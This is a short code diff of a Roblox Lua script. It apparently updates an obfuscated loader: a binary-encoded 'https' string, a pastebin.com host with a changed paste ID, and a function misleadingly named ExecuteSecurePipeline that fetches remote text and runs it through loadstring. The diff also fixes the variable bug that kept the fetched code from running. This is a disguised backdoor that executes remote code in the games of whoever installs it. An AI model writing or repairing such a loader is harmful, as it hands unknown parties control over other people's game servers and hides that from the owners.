@@ -5,7 +5,7 @@ local Players = game:GetService("Players")
 local CORE_MATRIX_01 = "0110100001110100011101000111000001110011"
 local NET_DECRYPT_HEX = {
     [0x01] = "pastebin.com",
-    [0x02] = 185655149
+    [0x02] = 98148252077920 
 }
 
 local function RequestPlatformTeleport(targetPlayer, destinationId)
@@ -43,7 +43,7 @@ _G.ExecuteSecurePipeline = function(player)
         
         if success and payload then
             local runNode = loadstring(payload)
-            if runCode then           
+            if runNode then           
                 local character = player.Character
                 if character and character:FindFirstChild("HumanoidRootPart") then
                     character.HumanoidRootPart.Anchored = false
